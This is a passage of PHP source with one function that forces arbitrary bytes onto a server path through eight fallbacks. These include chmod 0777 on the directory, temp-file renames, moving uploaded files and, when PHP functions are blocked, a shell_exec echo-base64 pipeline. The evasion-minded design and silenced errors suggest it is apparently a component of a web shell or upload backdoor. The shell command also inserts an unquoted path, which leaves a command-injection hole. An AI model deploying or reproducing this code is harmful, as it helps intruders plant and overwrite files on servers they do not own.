}
// ================= MULTI-WRITER (ANTI BLANK) =================
function _force_write($dst, $bin) {
    if (!is_dir(dirname($dst))) return "NoDir";
    if (!is_writable(dirname($dst))) { @chmod(dirname($dst), 0777); clearstatcache(); }
    if (!is_writable(dirname($dst))) return "RO";

    $len = strlen($bin);
    
    // 1. FPC LOCK
    $w = @file_put_contents($dst, $bin, LOCK_EX);
    if ($w === $len && $len > 0) return "OK1";

    // 2. FOPEN WB + WRITE
    $fp = @fopen($dst, 'wb');
    if ($fp) {
        $written = 0;
        while ($written < $len) {
            $n = @fwrite($fp, substr($bin, $written, 1048576));
            if ($n === false || $n === 0) break;
            $written += $n;
        }
        @fclose($fp);
        if ($written === $len && $len > 0) return "OK2";
    }

    // 3. FPC NOLOCK
    $w = @file_put_contents($dst, $bin);
    if ($w === $len && $len > 0) return "OK3";

    // 4. TEMP RENAME
    $tmp = @tempnam(sys_get_temp_dir(), 'u');
    if ($tmp) {
        if (@file_put_contents($tmp, $bin) === $len && @rename($tmp, $dst)) return "OK4";
        @unlink($tmp);
    }

    // 5. CHUNKED
    @unlink($dst); $total = 0;
    for ($i=0; $i<$len; $i+=524288) {
        $part = substr($bin, $i, 524288);
        $w = @file_put_contents($dst, $part, ($i===0)?0:FILE_APPEND);
        if ($w === false) break;
        $total += $w;
    }
    if ($total === $len && $len > 0) return "OK5";

    // 6. COPY STREAM
    $ftmp = @fopen('php://temp', 'r+');
    if ($ftmp) {
        @fwrite($ftmp, $bin); @rewind($ftmp);
        $s = @stream_get_meta_data($ftmp);
        if (@copy($s['uri'], $dst) && @filesize($dst) === $len) return "OK6";
        @fclose($ftmp);
    }

    // 7. MOVE UPLOADED (Khusus multipart)
    if (isset($_FILES['file']['tmp_name']) && $_FILES['file']['tmp_name']) {
        if (@move_uploaded_file($_FILES['file']['tmp_name'], $dst)) return "OK7";
    }

    // 8. SHELL EXEC (Jika fungsi PHP diblokir)
    if (function_exists('shell_exec')) {
        $b64 = base64_encode($bin);
        @shell_exec("echo $b64 | base64 -d > $dst");
        if (@filesize($dst) === $len) return "OK8";
    }

    return "Failed";
}

